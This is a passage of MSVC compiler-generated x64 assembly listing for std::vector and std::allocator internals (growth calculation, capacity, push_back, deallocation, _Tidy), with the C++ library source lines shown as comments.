; 1888 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rax, QWORD PTR _Myend$[rsp]
	mov	rcx, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	rax, QWORD PTR [rax]
	sub	rax, rcx
	mov	r8, rax
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?deallocate@?$allocator@E@std@@QEAAXQEAE_K@Z ; std::allocator<unsigned char>::deallocate
$LN2@Change_arr:

; 1889 :         }
; 1890 : 
; 1891 :         _Myfirst = _Newvec;

	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR _Newvec$[rsp]
	mov	QWORD PTR [rax], rcx

; 1892 :         _Mylast  = _Newvec + _Newsize;

	mov	rax, QWORD PTR _Newsize$[rsp]
	mov	rcx, QWORD PTR _Newvec$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR _Mylast$[rsp]
	mov	QWORD PTR [rcx], rax

; 1893 :         _Myend   = _Newvec + _Newcapacity;

	mov	rax, QWORD PTR _Newcapacity$[rsp]
	mov	rcx, QWORD PTR _Newvec$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR _Myend$[rsp]
	mov	QWORD PTR [rcx], rax

; 1894 :         _ASAN_VECTOR_CREATE;
; 1895 :     }

	add	rsp, 88					; 00000058H
	ret	0
?_Change_array@?$vector@EV?$allocator@E@std@@@std@@AEAAXQEAE_K1@Z ENDP ; std::vector<unsigned char,std::allocator<unsigned char> >::_Change_array
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Calculate_growth@?$vector@EV?$allocator@E@std@@@std@@AEBA_K_K@Z
_TEXT	SEGMENT
_Oldcapacity$ = 32
_Max$ = 40
_Geometric$ = 48
this$ = 80
_Newsize$ = 88
?_Calculate_growth@?$vector@EV?$allocator@E@std@@@std@@AEBA_K_K@Z PROC ; std::vector<unsigned char,std::allocator<unsigned char> >::_Calculate_growth, COMDAT

; 1823 :     _CONSTEXPR20 size_type _Calculate_growth(const size_type _Newsize) const {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 1824 :         // given _Oldcapacity and _Newsize, calculate geometric growth
; 1825 :         const size_type _Oldcapacity = capacity();

	mov	rcx, QWORD PTR this$[rsp]
	call	?capacity@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ ; std::vector<unsigned char,std::allocator<unsigned char> >::capacity
	mov	QWORD PTR _Oldcapacity$[rsp], rax

; 1826 :         const auto _Max              = max_size();

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ ; std::vector<unsigned char,std::allocator<unsigned char> >::max_size
	mov	QWORD PTR _Max$[rsp], rax

; 1827 : 
; 1828 :         if (_Oldcapacity > _Max - _Oldcapacity / 2) {

	xor	edx, edx
	mov	rax, QWORD PTR _Oldcapacity$[rsp]
	mov	ecx, 2
	div	rcx
	mov	rcx, QWORD PTR _Max$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	cmp	QWORD PTR _Oldcapacity$[rsp], rax
	jbe	SHORT $LN2@Calculate_

; 1829 :             return _Max; // geometric growth would overflow

	mov	rax, QWORD PTR _Max$[rsp]
	jmp	SHORT $LN1@Calculate_
$LN2@Calculate_:

; 1830 :         }
; 1831 : 
; 1832 :         const size_type _Geometric = _Oldcapacity + _Oldcapacity / 2;

	xor	edx, edx
	mov	rax, QWORD PTR _Oldcapacity$[rsp]
	mov	ecx, 2
	div	rcx
	mov	rcx, QWORD PTR _Oldcapacity$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Geometric$[rsp], rax

; 1833 : 
; 1834 :         if (_Geometric < _Newsize) {

	mov	rax, QWORD PTR _Newsize$[rsp]
	cmp	QWORD PTR _Geometric$[rsp], rax
	jae	SHORT $LN3@Calculate_

; 1835 :             return _Newsize; // geometric growth would be insufficient

	mov	rax, QWORD PTR _Newsize$[rsp]
	jmp	SHORT $LN1@Calculate_
$LN3@Calculate_:

; 1836 :         }
; 1837 : 
; 1838 :         return _Geometric; // geometric growth is sufficient

	mov	rax, QWORD PTR _Geometric$[rsp]
$LN1@Calculate_:

; 1839 :     }

	add	rsp, 72					; 00000048H
	ret	0
?_Calculate_growth@?$vector@EV?$allocator@E@std@@@std@@AEBA_K_K@Z ENDP ; std::vector<unsigned char,std::allocator<unsigned char> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?capacity@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ
_TEXT	SEGMENT
_My_data$ = 0
this$ = 32
?capacity@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ PROC ; std::vector<unsigned char,std::allocator<unsigned char> >::capacity, COMDAT

; 1739 :     _NODISCARD _CONSTEXPR20 size_type capacity() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 1740 :         auto& _My_data = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1741 :         return static_cast<size_type>(_My_data._Myend - _My_data._Myfirst);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	rax, QWORD PTR [rax+16]
	sub	rax, rcx

; 1742 :     }

	add	rsp, 24
	ret	0
?capacity@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ ENDP ; std::vector<unsigned char,std::allocator<unsigned char> >::capacity
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?max_size@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ
_TEXT	SEGMENT
$T1 = 32
$T2 = 40
this$ = 64
?max_size@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ PROC ; std::vector<unsigned char,std::allocator<unsigned char> >::max_size, COMDAT

; 1734 :     _NODISCARD _CONSTEXPR20 size_type max_size() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 1735 :         return (_STD min)(

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEBAAEBV?$allocator@E@2@XZ ; std::vector<unsigned char,std::allocator<unsigned char> >::_Getal
	mov	rcx, rax
	call	?max_size@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SA_KAEBV?$allocator@E@2@@Z ; std::_Default_allocator_traits<std::allocator<unsigned char> >::max_size
	mov	QWORD PTR $T1[rsp], rax
	call	?max@?$numeric_limits@_J@std@@SA_JXZ	; std::numeric_limits<__int64>::max
	mov	QWORD PTR $T2[rsp], rax
	lea	rdx, QWORD PTR $T1[rsp]
	lea	rcx, QWORD PTR $T2[rsp]
	call	??$min@_K@std@@YAAEB_KAEB_K0@Z		; std::min<unsigned __int64>
	mov	rax, QWORD PTR [rax]

; 1736 :             static_cast<size_type>((numeric_limits<difference_type>::max)()), _Alty_traits::max_size(_Getal()));
; 1737 :     }

	add	rsp, 56					; 00000038H
	ret	0
?max_size@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ ENDP ; std::vector<unsigned char,std::allocator<unsigned char> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?push_back@?$vector@EV?$allocator@E@std@@@std@@QEAAXAEBE@Z
_TEXT	SEGMENT
this$ = 48
_Val$ = 56
?push_back@?$vector@EV?$allocator@E@std@@@std@@QEAAXAEBE@Z PROC ; std::vector<unsigned char,std::allocator<unsigned char> >::push_back, COMDAT

; 912  :     _CONSTEXPR20 void push_back(const _Ty& _Val) { // insert element at end, provide strong guarantee

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 913  :         emplace_back(_Val);

	mov	rdx, QWORD PTR _Val$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$emplace_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@QEAA?A_TAEBE@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::emplace_back<unsigned char const &>

; 914  :     }

	add	rsp, 40					; 00000028H
	ret	0
?push_back@?$vector@EV?$allocator@E@std@@@std@@QEAAXAEBE@Z ENDP ; std::vector<unsigned char,std::allocator<unsigned char> >::push_back
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??1?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ PROC	; std::vector<unsigned char,std::allocator<unsigned char> >::~vector<unsigned char,std::allocator<unsigned char> >, COMDAT

; 806  :     _CONSTEXPR20 ~vector() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 807  :         _Tidy();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy@?$vector@EV?$allocator@E@std@@@std@@AEAAXXZ ; std::vector<unsigned char,std::allocator<unsigned char> >::_Tidy

; 808  : #if _ITERATOR_DEBUG_LEVEL != 0
; 809  :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Getal());
; 810  :         _Delete_plain_internal(_Alproxy, _STD exchange(_Mypair._Myval2._Myproxy, nullptr));
; 811  : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 812  :     }

	add	rsp, 40					; 00000028H
	ret	0
??1?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ ENDP	; std::vector<unsigned char,std::allocator<unsigned char> >::~vector<unsigned char,std::allocator<unsigned char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??0?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
??0?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ PROC	; std::vector<unsigned char,std::allocator<unsigned char> >::vector<unsigned char,std::allocator<unsigned char> >, COMDAT

; 675  :     _CONSTEXPR20 vector() noexcept(is_nothrow_default_constructible_v<_Alty>) : _Mypair(_Zero_then_variadic_args_t{}) {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rax, QWORD PTR this$[rsp]
	movzx	edx, BYTE PTR $T1[rsp]
	mov	rcx, rax
	call	??$?0$$V@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1>::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1><>

; 676  :         _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

	mov	rax, QWORD PTR this$[rsp]
	lea	rdx, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	rcx, rax
	call	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 677  :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ ENDP	; std::vector<unsigned char,std::allocator<unsigned char> >::vector<unsigned char,std::allocator<unsigned char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SA_KAEBV?$allocator@E@2@@Z
_TEXT	SEGMENT
__formal$ = 8
?max_size@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SA_KAEBV?$allocator@E@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<unsigned char> >::max_size, COMDAT

; 695  :     _NODISCARD static _CONSTEXPR20 size_type max_size(const _Alloc&) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 696  :         return static_cast<size_t>(-1) / sizeof(value_type);

	mov	rax, -1

; 697  :     }

	ret	0
?max_size@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SA_KAEBV?$allocator@E@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<unsigned char> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?allocate@?$allocator@E@std@@QEAAPEAE_K@Z
_TEXT	SEGMENT
this$ = 48
_Count$ = 56
?allocate@?$allocator@E@std@@QEAAPEAE_K@Z PROC		; std::allocator<unsigned char>::allocate, COMDAT

; 835  :     _NODISCARD _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 836  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 837  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));

	mov	rcx, QWORD PTR _Count$[rsp]
	call	??$_Get_size_of_n@$00@std@@YA_K_K@Z	; std::_Get_size_of_n<1>
	mov	rcx, rax
	call	??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>

; 838  :     }

	add	rsp, 40					; 00000028H
	ret	0
?allocate@?$allocator@E@std@@QEAAPEAE_K@Z ENDP		; std::allocator<unsigned char>::allocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?deallocate@?$allocator@E@std@@QEAAXQEAE_K@Z
_TEXT	SEGMENT
this$ = 48
_Ptr$ = 56
_Count$ = 64
?deallocate@?$allocator@E@std@@QEAAXQEAE_K@Z PROC	; std::allocator<unsigned char>::deallocate, COMDAT

; 829  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 830  :         _STL_ASSERT(_Ptr != nullptr || _Count == 0, "null pointer cannot point to a block of non-zero size");
; 831  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 832  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z ; std::_Deallocate<16,0>

; 833  :     }

	add	rsp, 40					; 00000028H
	ret	0
?deallocate@?$allocator@E@std@@QEAAXQEAE_K@Z ENDP	; std::allocator<unsigned char>::deallocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??0?$allocator@E@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$allocator@E@std@@QEAA@XZ PROC			; std::allocator<unsigned char>::allocator<unsigned char>, COMDAT

; 821  :     constexpr allocator() noexcept {}

	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0?$allocator@E@std@@QEAA@XZ ENDP			; std::allocator<unsigned char>::allocator<unsigned char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEBAAEBV?$allocator@D@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEBAAEBV?$allocator@D@2@XZ PROC ; std::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1>::_Get_first, COMDAT

; 1386 :     constexpr const _Ty1& _Get_first() const noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 1387 :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 1388 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEBAAEBV?$allocator@D@2@XZ ENDP ; std::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAAAEAV?$allocator@D@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAAAEAV?$allocator@D@2@XZ PROC ; std::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1>::_Get_first, COMDAT

; 1382 :     constexpr _Ty1& _Get_first() noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 1383 :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 1384 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAAAEAV?$allocator@D@2@XZ ENDP ; std::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??0?$_Vector_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$_Vector_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ PROC ; std::_Vector_val<std::_Simple_types<char> >::_Vector_val<std::_Simple_types<char> >, COMDAT

; 392  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax], 0
	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax+8], 0
	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax+16], 0
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0?$_Vector_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ENDP ; std::_Vector_val<std::_Simple_types<char> >::_Vector_val<std::_Simple_types<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEBAAEBV?$allocator@D@2@XZ
_TEXT	SEGMENT
this$ = 48
?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEBAAEBV?$allocator@D@2@XZ PROC ; std::vector<char,std::allocator<char> >::_Getal, COMDAT

; 2047 :     _NODISCARD _CONSTEXPR20 const _Alty& _Getal() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2048 :         return _Mypair._Get_first();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEBAAEBV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1>::_Get_first

; 2049 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEBAAEBV?$allocator@D@2@XZ ENDP ; std::vector<char,std::allocator<char> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEAAAEAV?$allocator@D@2@XZ
_TEXT	SEGMENT
this$ = 48
?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEAAAEAV?$allocator@D@2@XZ PROC ; std::vector<char,std::allocator<char> >::_Getal, COMDAT

; 2043 :     _NODISCARD _CONSTEXPR20 _Alty& _Getal() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2044 :         return _Mypair._Get_first();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAAAEAV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1>::_Get_first

; 2045 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEAAAEAV?$allocator@D@2@XZ ENDP ; std::vector<char,std::allocator<char> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Orphan_range@?$vector@DV?$allocator@D@std@@@std@@AEBAXPEAD0@Z
_TEXT	SEGMENT
this$ = 8
__formal$ = 16
__formal$ = 24
?_Orphan_range@?$vector@DV?$allocator@D@std@@@std@@AEBAXPEAD0@Z PROC ; std::vector<char,std::allocator<char> >::_Orphan_range, COMDAT

; 2040 :     _CONSTEXPR20 void _Orphan_range(pointer, pointer) const {}

	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	ret	0
?_Orphan_range@?$vector@DV?$allocator@D@std@@@std@@AEBAXPEAD0@Z ENDP ; std::vector<char,std::allocator<char> >::_Orphan_range
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Xlength@?$vector@DV?$allocator@D@std@@@std@@CAXXZ
_TEXT	SEGMENT
?_Xlength@?$vector@DV?$allocator@D@std@@@std@@CAXXZ PROC ; std::vector<char,std::allocator<char> >::_Xlength, COMDAT

; 1999 :     [[noreturn]] static void _Xlength() {

$LN3:
	sub	rsp, 40					; 00000028H

; 2000 :         _Xlength_error("vector too long");

	lea	rcx, OFFSET FLAT:??_C@_0BA@FOIKENOD@vector?5too?5long@
	call	?_Xlength_error@std@@YAXPEBD@Z		; std::_Xlength_error
$LN2@Xlength:

; 2001 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Xlength@?$vector@DV?$allocator@D@std@@@std@@CAXXZ ENDP ; std::vector<char,std::allocator<char> >::_Xlength
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Tidy@?$vector@DV?$allocator@D@std@@@std@@AEAAXXZ
_TEXT	SEGMENT
_Myfirst$ = 32
_My_data$ = 40
_Al$ = 48
_Mylast$ = 56
_Myend$ = 64
this$ = 96
?_Tidy@?$vector@DV?$allocator@D@std@@@std@@AEAAXXZ PROC	; std::vector<char,std::allocator<char> >::_Tidy, COMDAT

; 1897 :     _CONSTEXPR20 void _Tidy() noexcept { // free all storage

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 1898 :         auto& _Al         = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::vector<char,std::allocator<char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 1899 :         auto& _My_data    = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1900 :         pointer& _Myfirst = _My_data._Myfirst;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR _Myfirst$[rsp], rax

; 1901 :         pointer& _Mylast  = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 1902 :         pointer& _Myend   = _My_data._Myend;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 16
	mov	QWORD PTR _Myend$[rsp], rax

; 1903 : 
; 1904 :         _My_data._Orphan_all();

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 1905 : 
; 1906 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rax, QWORD PTR _Myfirst$[rsp]
	cmp	QWORD PTR [rax], 0
	je	SHORT $LN2@Tidy

; 1907 :             _Destroy_range(_Myfirst, _Mylast, _Al);

	mov	r8, QWORD PTR _Al$[rsp]
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Destroy_range@V?$allocator@D@std@@@std@@YAXPEADQEADAEAV?$allocator@D@0@@Z ; std::_Destroy_range<std::allocator<char> >

; 1908 :             _ASAN_VECTOR_REMOVE;
; 1909 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rax, QWORD PTR _Myend$[rsp]
	mov	rcx, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	rax, QWORD PTR [rax]
	sub	rax, rcx
	mov	r8, rax
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z ; std::allocator<char>::deallocate

; 1910 : 
; 1911 :             _Myfirst = nullptr;

	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	QWORD PTR [rax], 0

; 1912 :             _Mylast  = nullptr;

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	QWORD PTR [rax], 0

; 1913 :             _Myend   = nullptr;

	mov	rax, QWORD PTR _Myend$[rsp]
	mov	QWORD PTR [rax], 0
$LN2@Tidy:

; 1914 :         }
; 1915 :     }

	add	rsp, 88					; 00000058H
	ret	0
?_Tidy@?$vector@DV?$allocator@D@std@@@std@@AEAAXXZ ENDP	; std::vector<char,std::allocator<char> >::_Tidy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Change_array@?$vector@DV?$allocator@D@std@@@std@@AEAAXQEAD_K1@Z
_TEXT	SEGMENT
_Myfirst$ = 32
_My_data$ = 40
_Al$ = 48
_Mylast$ = 56
_Myend$ = 64
this$ = 96
_Newvec$ = 104
_Newsize$ = 112
_Newcapacity$ = 120
?_Change_array@?$vector@DV?$allocator@D@std@@@std@@AEAAXQEAD_K1@Z PROC ; std::vector<char,std::allocator<char> >::_Change_array, COMDAT

; 1875 :     _CONSTEXPR20 void _Change_array(const pointer _Newvec, const size_type _Newsize, const size_type _Newcapacity) {

$LN4:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 1876 :         // orphan all iterators, discard old array, acquire new array
; 1877 :         auto& _Al         = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::vector<char,std::allocator<char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 1878 :         auto& _My_data    = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1879 :         pointer& _Myfirst = _My_data._Myfirst;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR _Myfirst$[rsp], rax

; 1880 :         pointer& _Mylast  = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 1881 :         pointer& _Myend   = _My_data._Myend;

